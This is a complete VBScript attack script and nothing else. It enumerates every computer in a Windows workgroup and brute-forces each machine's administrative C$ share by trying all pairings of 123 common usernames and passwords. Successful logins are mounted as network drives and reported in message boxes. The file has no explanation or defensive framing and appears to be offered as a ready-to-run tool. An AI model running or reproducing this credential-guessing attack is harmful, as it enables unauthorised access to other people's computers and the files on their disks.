On Error Resume Next
Dim U(123)
Dim D(4)
Dim ntwk
Dim q
q = 0
Set ntwk = WScript.CreateObject("WScript.Network")

U(0) = "administrator": U(1) = "admin": U(2) = "manager": U(3) = "system": U(4) = "service": U(5) = "guest": U(6) = "field": U(7) = "user": U(8) = "who": U(9) = "visitor": U(10) = "anonymous": U(11) = "public": U(12) = "private": U(13) = "default": U(14) = "test": U(15) = "super": U(16) = "security": U(17) = "server": U(18) = "computer": U(19) = "secret": U(20) = "name": U(21) = "root": U(22) = "internet": U(23) = "pass": U(24) = "password": U(25) = "monkey": U(26) = "michael": U(27) = "12345678": U(28) = "superman": U(29) = "qwerty": U(30) = "dragon": U(31) = "abc123": U(32) = "1234567": U(33) = "12345": U(34) = "shadow": U(35) = "jordan": U(36) = "princess": U(37) = "iloveyou": U(38) = "football": U(39) = "111111": U(40) = "welcome": U(41) = "master": U(42) = "letmein": U(43) = "jennifer": U(44) = "baseball": U(45) = "654321": U(46) = "whatever": U(47) = "sunshine": U(48) = "michelle": U(49) = "joshua": U(50) = "ginger": U(51) = "daniel": U(52) = "ashley": U(53) = "anthony": U(54) = "123456789": U(55) = "123123": U(56) = "0": U(57) = "yellow": U(58) = "william": U(59) = "trustno1": U(60) = "tigger": U(61) = "thomas": U(62) = "taylor": U(63) = "soccer": U(64) = "samantha": U(65) = "purple": U(66) = "superuser": U(67) = "pepper": U(68) = "orange": U(69) = "nicole": U(70) = "mustang": U(71) = "money": U(72) = "mickey": U(73) = "matthew": U(74) = "justin": U(75) = "jasmine": U(76) = "harley": U(77) = "freedom": U(78) = "cookie": U(79) = "charlie": U(80) = "buster": U(81) = "brandon": U(82) = "batman": U(83) = "bailey": U(84) = "babygirl": U(85) = "austin": U(86) = "angels": U(87) = "andrew": U(88) = "1234": U(89) = "sql": U(90) = "database": U(91) = "oracle": U(92) = "thunder": U(93) = "summer": U(94) = "success": U(95) = "rockyou": U(96) = "robert": U(97) = "ranger": U(98) = "pl.": U(99) = "ninja": U(100) = "mss.": U(101) = "merlin": U(102) = "maggie": U(103) = "madison": U(104) = "lovely": U(105) = "love": U(106) = "junior": U(107) = "joseph": U(108) = "jessica": U(109) = "hunter": U(110) = "hello": U(111) = "hannah": U(112) = "hammer": U(113) = "flower": U(114) = "family": U(115) = "dick": U(116) = "dallas": U(117) = "crystal": U(118) = "cheese": U(119) = "butterfly": U(120) = "amanda": U(121) = "696969": U(122) = "666666"

D(0) = "Z:": D(1) = "Y:": D(2) = "X:": D(3) = "W:"

Set objDomain = GetObject("WinNT://WORKGROUP")
For each objDomainItem in objDomain
If objDomainItem.Class = "Computer" then
For i = 0 to 122 'username
For r = 0 to 122 'pass
ntwk.MapNetworkDrive D(q),"\\" & objDomainItem.Name & "\c$",False,U(i),U(r)
If Err Then 
Err.Clear()
Else
MsgBox(D(q) & " " & objDomainItem.Name & " " & U(i) & " " & U(r))
q = q + 1
End If
Next
Next
End if
Next